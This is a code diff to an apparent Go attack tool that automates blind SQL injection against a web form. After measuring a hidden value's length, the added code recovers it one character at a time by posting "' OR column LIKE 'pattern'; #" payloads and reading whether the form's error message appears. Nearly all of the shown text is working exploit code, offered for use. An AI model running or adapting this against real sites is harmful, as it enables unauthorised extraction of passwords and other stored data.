@@ -16,6 +16,8 @@ const colorRed = "\033[31m"
 const colorGreen = "\033[32m"
 const colorBlue = "\033[34m"
 
+const chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_-!?@%"
+
 var reader = bufio.NewReader(os.Stdin)
 
 func handleError(message string, err error) {
@@ -72,13 +74,13 @@ func attack() {
 
 			return !strings.Contains(body, errorMessage)
 		}
-		i := 0
+		size := 0
 		result := false
 		for !result {
-			i++
-			result = test(i)
+			size++
+			result = test(size)
 		}
-		fmt.Print(colorGreen)
+		fmt.Print(colorBlue)
 		fmt.Println(`
        _,    _   _    ,_
   .o888P     Y8o8Y     Y888o.
@@ -91,8 +93,48 @@ YJGS8P"Y888P"Y888P"Y888P"Y8888P
   '8o          V          o8'
     '                     '
 		`)
-		fmt.Printf("   %s=> Size: %d\n", colorRed, i)
+		fmt.Printf("   %s=> Size: %d\n", colorGreen, size)
 
+		check := func(index int, char string) bool {
+			pattern := strings.Repeat("_", index)
+			pattern += char
+			pattern += strings.Repeat("_", size-index-1)
+
+			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, pattern)
+			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
+			res, err := http.PostForm(targetUrl, values)
+			handleError("Cannot post form", err)
+
+			defer res.Body.Close()
+
+			bytes, err := ioutil.ReadAll(res.Body)
+
+			body := string(bytes)
+
+			return !strings.Contains(body, errorMessage)
+		}
+
+		fmt.Printf("   %s=> ", colorGreen)
+		for i := 0; i < size; i++ {
+			found := false
+			for _, char := range chars {
+				str := string(char)
+				if str == "_" {
+					str = "\\_"
+				} else if str == "%" {
+					str = "\\@"
+				}
+				if check(i, str) {
+					fmt.Print(str)
+					found = true
+					break
+				}
+			}
+			if !found {
+				fmt.Printf("%s?%s", colorRed, colorGreen)
+			}
+		}
+		fmt.Println()
 	}
 }
 
